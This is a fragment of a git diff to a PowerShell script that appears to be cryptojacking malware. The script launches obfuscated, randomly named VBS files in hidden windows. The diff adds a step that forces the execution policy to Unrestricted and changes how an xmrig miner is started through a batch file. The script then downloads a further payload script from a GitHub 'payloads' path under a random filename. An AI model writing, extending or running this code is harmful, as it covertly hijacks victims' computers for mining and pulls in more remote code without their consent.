@@ -147,9 +147,15 @@ cd $initial_dir
 # Start Autorun
 Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwjOosKx.vbs"
 
-Start-Process -windowstyle hidden -ArgumentList "$initial_dir\xmrig-6.22.2\w.bat" -FilePath "cscript.exe"
+#Start-Process -windowstyle hidden -ArgumentList "$initial_dir\xmrig-6.22.2\w.bat" -FilePath "cscript.exe"
 
 # Start Rig
+# Set execution policy (if needed)
+Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
+cd "$initial_dir\xmrig-6.22.2"
+Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
+#Start-Process -FilePath ".\xmrig.exe" -ArgumentList "--config=config.json" -NoNewWindow -Wait
+
 #Start-Process -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe" -windowstyle hidden 
 & "./TMqhONoBljEv.vbs"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/tasks.ps1" -OutFile "AEQKCPrkuifY.ps1"
